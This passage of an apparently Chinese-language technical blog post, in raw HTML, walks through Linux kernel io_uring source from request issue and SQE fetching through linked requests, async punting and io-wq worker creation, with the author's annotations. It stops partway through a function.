class="literal">NULL</span>;</span><br><span class="line"><span class="type">int</span> ret;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (unlikely(!io_assign_file(req, def, issue_flags)))</span><br><span class="line"><span class="keyword">return</span> -EBADF;</span><br><span class="line"><span class="comment">// 为请求分配文件描述符</span></span><br><span class="line"><span class="keyword">if</span> (unlikely((req-&gt;flags &amp; REQ_F_CREDS) &amp;&amp; req-&gt;creds != current_cred()))</span><br><span class="line">creds = override_creds(req-&gt;creds);</span><br><span class="line"><span class="comment">// 备份和恢复请求执行线程的安全凭证</span></span><br><span class="line"><span class="keyword">if</span> (!def-&gt;audit_skip)</span><br><span class="line">audit_uring_entry(req-&gt;opcode);</span><br><span class="line"><span class="comment">// 调用audit跟踪提交事件</span></span><br><span class="line"></span><br><span class="line">ret = def-&gt;issue(req, issue_flags);</span><br><span class="line"><span class="comment">// 调用def-&gt;issue执行请求</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!def-&gt;audit_skip)</span><br><span class="line">audit_uring_exit(!ret, ret);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (creds)</span><br><span class="line">revert_creds(creds);</span><br><span class="line"><span class="comment">// 恢复凭证</span></span><br><span class="line"><span class="keyword">if</span> (ret == IOU_OK) &#123;</span><br><span class="line"><span class="keyword">if</span> (issue_flags &amp; IO_URING_F_COMPLETE_DEFER)</span><br><span class="line"><span class="comment">// 如果成功并且标记了延迟完成,注册延迟完成回调</span></span><br><span class="line">io_req_complete_defer(req);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">io_req_complete_post(req, issue_flags);</span><br><span class="line"><span class="comment">//  否则直接提交完成 </span></span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (ret != IOU_ISSUE_SKIP_COMPLETE)</span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* If the op doesn&#x27;t have a file, we&#x27;re not polling for it */</span></span><br><span class="line"><span class="keyword">if</span> ((req-&gt;ctx-&gt;flags &amp; IORING_SETUP_IOPOLL) &amp;&amp; def-&gt;iopoll_queue)</span><br><span class="line">io_iopoll_req_issued(req, issue_flags);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="io-get-sqe-重要"><code>io_get_sqe</code> |  重要</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">bool</span> <span class="title function_">io_get_sqe</span><span class="params">(<span class="keyword">struct</span> io_ring_ctx *ctx, <span class="type">const</span> <span class="keyword">struct</span> io_uring_sqe **sqe)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">unsigned</span> mask = ctx-&gt;sq_entries - <span class="number">1</span>;</span><br><span class="line"><span class="type">unsigned</span> head = ctx-&gt;cached_sq_head++ &amp; mask;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!(ctx-&gt;flags &amp; IORING_SETUP_NO_SQARRAY)) &#123;</span><br><span class="line">head = READ_ONCE(ctx-&gt;sq_array[head]);</span><br><span class="line"><span class="comment">// 如果没有设置NOSQARRAY 直接从array读</span></span><br><span class="line"><span class="keyword">if</span> (unlikely(head &gt;= ctx-&gt;sq_entries)) &#123;</span><br><span class="line"><span class="comment">// 丢弃无效 entries</span></span><br><span class="line">spin_lock(&amp;ctx-&gt;completion_lock);</span><br><span class="line">ctx-&gt;cq_extra--;</span><br><span class="line">spin_unlock(&amp;ctx-&gt;completion_lock);</span><br><span class="line">WRITE_ONCE(ctx-&gt;rings-&gt;sq_dropped,</span><br><span class="line">   READ_ONCE(ctx-&gt;rings-&gt;sq_dropped) + <span class="number">1</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (ctx-&gt;flags &amp; IORING_SETUP_SQE128)</span><br><span class="line">head &lt;&lt;= <span class="number">1</span>;</span><br><span class="line">*sqe = &amp;ctx-&gt;sq_sqes[head];</span><br><span class="line"><span class="comment">// 从 sq_sqes 取一个sqe </span></span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="io-submit-sqe-同步与异步的请求执行"><code>io_submit_sqe</code> | 同步与异步的请求执行</h3><p>我们首先回到 <code>io_submit_sqe</code></p><p>我们注意到, 如果存在 LINK 标记, 只是将这个req添加到链上,  而没有 <code>io_queue_sqe</code>.</p><p>如果前一个请求有 LINK 标记, 此时没有, 也只是将请求加入链中后, 清空 head.  此时调用的是 <code>io_queue_sqe(NULL)</code></p><p>综上, 对于link, 并没有直接处理.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (unlikely(link-&gt;head)) &#123;</span><br><span class="line"><span class="comment">// 如果链表已经有了一个head 请求, 意味着之前sqe 有 `IOSQE_IO_LINK` 标志</span></span><br><span class="line">ret = io_req_prep_async(req);</span><br><span class="line"><span class="comment">// 准备异步提交状态</span></span><br><span class="line"><span class="keyword">if</span> (unlikely(ret))</span><br><span class="line"><span class="keyword">return</span> io_submit_fail_init(sqe, req, ret);</span><br><span class="line"></span><br><span class="line">trace_io_uring_link(req, link-&gt;head);</span><br><span class="line">link-&gt;last-&gt;link = req;</span><br><span class="line">link-&gt;last = req;</span><br><span class="line"><span class="comment">// 将本项挂载到链表</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (req-&gt;flags &amp; IO_REQ_LINK_FLAGS)</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="comment">// 如果此项没有 LINK 标志, 清空 链表</span></span><br><span class="line"><span class="comment">/* last request of the link, flush it */</span></span><br><span class="line">req = link-&gt;head;</span><br><span class="line">link-&gt;head = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (req-&gt;flags &amp; (REQ_F_FORCE_ASYNC | REQ_F_FAIL))</span><br><span class="line"><span class="keyword">goto</span> fallback;</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (unlikely(req-&gt;flags &amp; (IO_REQ_LINK_FLAGS |</span><br><span class="line">  REQ_F_FORCE_ASYNC | REQ_F_FAIL))) &#123;</span><br><span class="line"><span class="comment">// 如果之前的任务没有LINK 标记, 但此任务有, 给链表添加一个头</span></span><br><span class="line"><span class="keyword">if</span> (req-&gt;flags &amp; IO_REQ_LINK_FLAGS) &#123;</span><br><span class="line">link-&gt;head = req;</span><br><span class="line">link-&gt;last = req;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">fallback:  </span><br><span class="line"><span class="comment">// 加入降级提交fallback队列</span></span><br><span class="line">io_queue_sqe_fallback(req);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 加入普通提交队列</span></span><br><span class="line">io_queue_sqe(req);</span><br></pre></td></tr></table></figure><p>再次重回 <code>io_queue_sqe</code> 函数, 我们发现其在调用  <code>io_issue_sqe</code> 时设置了这样两个标志  <code>IO_URING_F_NONBLOCK|IO_URING_F_COMPLETE_DEFER</code>, 字面意义上理解, 就是非阻塞与延迟完成.</p><p>首先为什么要非阻塞呢?</p><p>让我们往前回想, 发现, 在 IOPOLL 模式下,  <code>io_uring_enter</code> 也是调用了 <code>io_submit_sqes</code> , 最终也会调用到此函数, 所以如果这个函数阻塞了, IOPOLL模式下, 用户进程实际上也是阻塞的, 也就不符合异步的初衷了</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span> <span class="title function_">io_queue_sqe</span><span class="params">(<span class="keyword">struct</span> io_kiocb *req)</span></span><br><span class="line">__<span class="title function_">must_hold</span><span class="params">(&amp;req-&gt;ctx-&gt;uring_lock)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> ret;</span><br><span class="line"></span><br><span class="line">ret = io_issue_sqe(req, IO_URING_F_NONBLOCK|IO_URING_F_COMPLETE_DEFER);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * We async punt it if the file wasn&#x27;t marked NOWAIT, or if the file</span></span><br><span class="line"><span class="comment"> * doesn&#x27;t support non-blocking read/write attempts</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (likely(!ret))</span><br><span class="line">io_arm_ltimeout(req);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">io_queue_async(req, ret);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接下来再进入 <code>io_issue_sqe</code> , 其中使用了一个虚表调用处理函数, 并且之前的flag也作为参数传入了.</p><p>而我们知道, 如read, write等很多操作, 都是阻塞的, 不能 <code>NOBLOCK</code>  , 因此, 这个执行只是一个尝试执行, 实际上并没有真正完成请求</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ret = def-&gt;issue(req, issue_flags);</span><br><span class="line"><span class="comment">// 调用def-&gt;issue执行请求</span></span><br></pre></td></tr></table></figure><p>接下来我们注意到, 在 <code>io_queue_sqe</code> 调用此函数时, 设置了 <code>IO_URING_F_COMPLETE_DEFER</code> 标志</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (ret == IOU_OK) &#123;</span><br><span class="line"><span class="keyword">if</span> (issue_flags &amp; IO_URING_F_COMPLETE_DEFER)</span><br><span class="line"><span class="comment">// 如果成功并且标记了延迟完成,注册延迟完成回调</span></span><br><span class="line">io_req_complete_defer(req);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">io_req_complete_post(req, issue_flags);</span><br><span class="line"><span class="comment">//  否则直接提交完成 </span></span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (ret != IOU_ISSUE_SKIP_COMPLETE)</span><br><span class="line"><span class="keyword">return</span> ret;</span><br></pre></td></tr></table></figure><p>继续进入 <code>io_req_complete_defer</code>  发现实际上就是将请求插入插入链表</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span> <span class="title function_">io_req_complete_defer</span><span class="params">(<span class="keyword">struct</span> io_kiocb *req)</span></span><br><span class="line">__<span class="title function_">must_hold</span><span class="params">(&amp;req-&gt;ctx-&gt;uring_lock)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">io_submit_state</span> *<span class="title">state</span> =</span> &amp;req-&gt;ctx-&gt;submit_state;</span><br><span class="line"></span><br><span class="line">lockdep_assert_held(&amp;req-&gt;ctx-&gt;uring_lock);</span><br><span class="line"></span><br><span class="line">wq_list_add_tail(&amp;req-&gt;comp_list, &amp;state-&gt;compl_reqs);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这也没有完成请求.</p><p>那么真正完成请求是在哪? 让我们继续分析</p><h4 id="io-queue-async"><code>io_queue_async</code></h4><p>在 <code>io_issue_sqe</code>  返回后,  <code>io_queue_sqe</code> 继续调用了此函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">io_queue_async</span><span class="params">(<span class="keyword">struct</span> io_kiocb *req, <span class="type">int</span> ret)</span></span><br><span class="line">__<span class="title function_">must_hold</span><span class="params">(&amp;req-&gt;ctx-&gt;uring_lock)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">io_kiocb</span> *<span class="title">linked_timeout</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (ret != -EAGAIN || (req-&gt;flags &amp; REQ_F_NOWAIT)) &#123;</span><br><span class="line">io_req_defer_failed(req, ret);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;<span class="comment">// 如果请求是不可等待的必须立马完成的, 就不能推迟</span></span><br><span class="line"></span><br><span class="line">linked_timeout = io_prep_linked_timeout(req);</span><br><span class="line"></span><br><span class="line"><span class="keyword">switch</span> (io_arm_poll_handler(req, <span class="number">0</span>)) &#123;</span><br><span class="line"><span class="comment">// 这里调用了一个 论询问 handler, 确定 请求的类型</span></span><br><span class="line"><span class="keyword">case</span> IO_APOLL_READY:</span><br><span class="line"><span class="comment">// 如果已经可以完成了</span></span><br><span class="line">io_kbuf_recycle(req, <span class="number">0</span>);</span><br><span class="line">io_req_task_queue(req);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> IO_APOLL_ABORTED:</span><br><span class="line"><span class="comment">// 如果终止了</span></span><br><span class="line">io_kbuf_recycle(req, <span class="number">0</span>);</span><br><span class="line">io_queue_iowq(req, <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> IO_APOLL_OK:</span><br><span class="line"><span class="comment">// 如果已经完成了</span></span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (linked_timeout)</span><br><span class="line">io_queue_linked_timeout(linked_timeout);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>主要到, 当为 <code>IO_APOLL_ABORTED</code> 时,  调用了 <code>io_queue_iowq</code></p><p>这里先介绍一下 kernel <a href="https://docs.kernel.org/core-api/workqueue.html">work queue</a> 机制,  workqueue 是一个内核线程池, 当有任务来时, 就从线程池中寻找一个线程运行, 这里就是将请求放入线程池的队列中</p><p>这里可能会有读者有疑问, 那线程池是什么时候创建的呢? 其实是在被笔者跳过的 <code>ctx</code> 的创建过程中// #TODO  由于过于繁杂, 笔者暂时没有分析</p><h3 id="io-queue-iowq-任务处理线程池"><code>io_queue_iowq</code> | 任务处理线程池</h3><p>这一部分也比较重要, 首先是 <code>io_prep_async_link(req)</code>  , 为在一条链上的请求创建 work 结构, 用来放入队列中, 并且 通过  <code>io_wq_enqueue</code> 将其加入线程池队列</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">io_queue_iowq</span><span class="params">(<span class="keyword">struct</span> io_kiocb *req, <span class="keyword">struct</span> io_tw_state *ts_dont_use)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">io_kiocb</span> *<span class="title">link</span> =</span> io_prep_linked_timeout(req);</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">io_uring_task</span> *<span class="title">tctx</span> =</span> req-&gt;task-&gt;io_uring;</span><br><span class="line"></span><br><span class="line">BUG_ON(!tctx);</span><br><span class="line">BUG_ON(!tctx-&gt;io_wq);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* init -&gt;work of the whole link before punting */</span></span><br><span class="line">io_prep_async_link(req);</span><br><span class="line"><span class="comment">// 为链少的每一个 req 准备work结构</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Not expected to happen, but if we do have a bug where this _can_</span></span><br><span class="line"><span class="comment"> * happen, catch it here and ensure the request is marked as</span></span><br><span class="line"><span class="comment"> * canceled. That will make io-wq go through the usual work cancel</span></span><br><span class="line"><span class="comment"> * procedure rather than attempt to run this request (or create a new</span></span><br><span class="line"><span class="comment"> * worker for it).</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (WARN_ON_ONCE(!same_thread_group(req-&gt;task, current)))</span><br><span class="line">req-&gt;work.flags |= IO_WQ_WORK_CANCEL;</span><br><span class="line"></span><br><span class="line">trace_io_uring_queue_async_work(req, io_wq_is_hashed(&amp;req-&gt;work));</span><br><span class="line">io_wq_enqueue(tctx-&gt;io_wq, &amp;req-&gt;work);</span><br><span class="line"><span class="keyword">if</span> (link)</span><br><span class="line">io_queue_linked_timeout(link);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>为什么要用work结构而不是 <code>io_kiocb</code> 结构呢, work结构是 <code>io_kiocb</code> 的一个成员, 通过指针减去偏移就可以得到 <code>io_kiocb</code> 的指针, 与此通过, 由于work结构更小, 创建临时结构体时占用空间更小</p><h4 id="io-wq-enqueue"><code>io_wq_enqueue</code></h4><p><code>io_wq_enqueue</code>  是将任务加入 <code>io_wq</code> 线程池的任务队列中.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">io_wq_enqueue</span><span class="params">(<span class="keyword">struct</span> io_wq *wq, <span class="keyword">struct</span> io_wq_work *work)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">io_wq_acct</span> *<span class="title">acct</span> =</span> io_work_get_acct(wq, work);</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">io_cb_cancel_data</span> <span class="title">match</span>;</span></span><br><span class="line"><span class="type">unsigned</span> work_flags = work-&gt;flags;</span><br><span class="line"><span class="type">bool</span> do_create;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * If io-wq is exiting for this task, or if the request has explicitly</span></span><br><span class="line"><span class="comment"> * been marked as one that should not get executed, cancel it here.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (test_bit(IO_WQ_BIT_EXIT, &amp;wq-&gt;state) ||</span><br><span class="line">    (work-&gt;flags &amp; IO_WQ_WORK_CANCEL)) &#123;</span><br><span class="line">io_run_cancel(work, wq);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 如果需要取消 work  </span></span><br><span class="line">raw_spin_lock(&amp;acct-&gt;lock);</span><br><span class="line">io_wq_insert_work(wq, work);</span><br><span class="line">clear_bit(IO_ACCT_STALLED_BIT, &amp;acct-&gt;flags);</span><br><span class="line">raw_spin_unlock(&amp;acct-&gt;lock);</span><br><span class="line"></span><br><span class="line">rcu_read_lock();</span><br><span class="line">do_create = !io_wq_activate_free_worker(wq, acct);</span><br><span class="line">rcu_read_unlock();</span><br><span class="line"><span class="comment">// 是否需要创建worker</span></span><br><span class="line"><span class="keyword">if</span> (do_create &amp;&amp; ((work_flags &amp; IO_WQ_WORK_CONCURRENT) ||</span><br><span class="line">    !<span class="type">atomic_read</span>(&amp;acct-&gt;nr_running))) &#123;</span><br><span class="line"><span class="type">bool</span> did_create;</span><br><span class="line"></span><br><span class="line">did_create = io_wq_create_worker(wq, acct);</span><br><span class="line"><span class="comment">// 创建worker</span></span><br><span class="line"><span class="keyword">if</span> (likely(did_create))</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line"><span class="comment">// 如果已经创建了, 直接返回</span></span><br><span class="line">raw_spin_lock(&amp;wq-&gt;lock);</span><br><span class="line"><span class="keyword">if</span> (acct-&gt;nr_workers) &#123;</span><br><span class="line">raw_spin_unlock(&amp;wq-&gt;lock);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line">raw_spin_unlock(&amp;wq-&gt;lock);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* fatal condition, failed to create the first worker */</span></span><br><span class="line">match.fn= io_wq_work_match_item,</span><br><span class="line">match.data= work,</span><br><span class="line">match.cancel_all= <span class="literal">false</span>,</span><br><span class="line"></span><br><span class="line">io_acct_cancel_pending_work(wq, acct, &amp;match);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>实际上调用了 <code>io_wq_create_worker</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">bool</span> <span class="title function_">io_wq_create_worker</span><span class="params">(<span class="keyword">struct</span> io_wq *wq, <span class="keyword">struct</span> io_wq_acct *acct)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (unlikely(!acct-&gt;max_workers))</span><br><span class="line">pr_warn_once(<span class="string">&quot;io-wq is not configured for unbound workers&quot;</span>);</span><br><span class="line"></span><br><span class="line">raw_spin_lock(&amp;wq-&gt;lock);</span><br><span class="line"><span class="keyword">if</span> (acct-&gt;nr_workers &gt;= acct-&gt;max_workers) &#123;</span><br><span class="line">raw_spin_unlock(&amp;wq-&gt;lock);</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 如果已经有上限个 worker了</span></span><br><span class="line"><span class="comment">// 直接返回</span></span><br><span class="line"></span><br><span class="line">acct-&gt;nr_workers++;</span><br><span class="line">raw_spin_unlock(&amp;wq-&gt;lock);</span><br><span class="line"><span class="type">atomic_inc</span>(&amp;acct-&gt;nr_running);</span><br><span class="line"><span class="type">atomic_inc</span>(&amp;wq-&gt;worker_refs);</span><br><span class="line"><span class="keyword">return</span> create_io_worker(wq, acct-&gt;index);</span><br><span class="line"><span class="comment">// 创建一个新worker</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="create-io-worker-worker处理线程的创建"><code>create_io_worker</code>  |  worker处理线程的创建</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">bool</span> <span class="title function_">create_io_worker</span><span class="params">(<span class="keyword">struct</span> io_wq *wq, <span class="type">int</span> index)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">io_wq_acct</span> *<span class="title">acct</span> =</span> &amp;wq-&gt;acct[index];</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">io_worker</span> *<span class="title">worker</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">tsk</span>;</span></span><br><span class="line"></span><br><span class="line">__set_current_state(TASK_RUNNING);</span><br><span class="line"></span><br><span class="line">worker = kzalloc(<span class="keyword">sizeof</span>(*worker), GFP_KERNEL);</span><br><span class="line"><span class="comment">// 为work分配了空间</span></span><br><span class="line"><span class="keyword">if</span> (!worker) &#123;</span><br><span class="line">fail:</span><br><span class="line"><span class="type">atomic_dec</span>(&amp;acct-&gt;nr_running);</span><br><span class="line">raw_spin_lock(&amp;wq-&gt;lock);</span><br><span class="line">acct-&gt;nr_workers--;</span><br><span class="line">raw_spin_unlock(&amp;wq-&gt;lock);</span><br><span class="line">io_worker_ref_put(wq);</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">refcount_set(&amp;worker-&gt;ref, <span class="number">1</span>);</span><br><span class="line">worker-&gt;wq = wq;</span><br><span class="line">raw_spin_lock_init(&amp;worker-&gt;lock);</span><br><span class="line">init_completion(&amp;worker-&gt;ref_done);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (index == IO_WQ_ACCT_BOUND)</span><br><span class="line">worker-&gt;flags |= IO_WORKER_F_BOUND;</span><br><span class="line"></span><br><span class="line">tsk = create_io_thread(io_wq_worker, worker, NUMA_NO_NODE);</span><br><span class="line"><span class="comment">// 创建处理线程</span></span><br><span class="line"><span class="keyword">if</span> (!IS_ERR(tsk)) &#123;</span><br><span class="line">io_init_new_worker(wq, worker, tsk);</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (!io_should_retry_thread(PTR_ERR(tsk))) &#123;</span><br><span class="line">kfree(worker);</span><br><span class="line"><span 